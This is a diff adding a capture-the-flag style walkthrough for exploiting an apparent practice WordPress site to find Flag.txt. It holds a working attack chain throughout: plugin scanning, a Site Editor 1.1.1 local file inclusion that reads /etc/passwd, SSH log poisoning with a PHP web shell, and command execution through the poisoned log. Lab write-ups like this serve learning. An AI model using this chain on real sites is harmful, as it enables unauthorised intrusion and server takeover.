@@ -1,0 +1,35 @@
+website: pentest.breakthecode.com
+task: exploit and find out the file named Flag.txt and code in it. 
+
+procedure: 
+1. Explore site, its a wordpress website. 
+2. scan through for outdated plugins.
+wpscan --url pentest.breakthecode.com --enumerate p
+3. ┌──(kali㉿kali)-[~]
+└─$ searchsploit "site editor 1.1.1"
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                         |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting                                                                                 | php/webapps/25493.txt
+WordPress Plugin Site Editor 1.1.1 - Local File Inclusion                                                                                                              | php/webapps/44340.txt
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+
+4. It is https://www.exploit-db.com/exploits/44340
+5. which says there is LFI
+** Proof of Concept **
+http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd 
+
+6. Try
+http://pentest.breakthecode.com/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
+
+7. do a nmap 
+nmap -T5 -A http://pentest.breakthecode.com/
+which says its apache and ssh service is running
+
+8. Now, try accessing /var/log/auth.log 
+when you get it that means its ssh-log poisoning website. 
+
+9. ssh '<?php system($_GET["cmd"]); ?>'@target-ip
+explore this https://highon.coffee/blog/lfi-cheat-sheet/
+
+10. http://pentest.breakthecode.com/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/auth.log&cmd=locate+Flag.txt
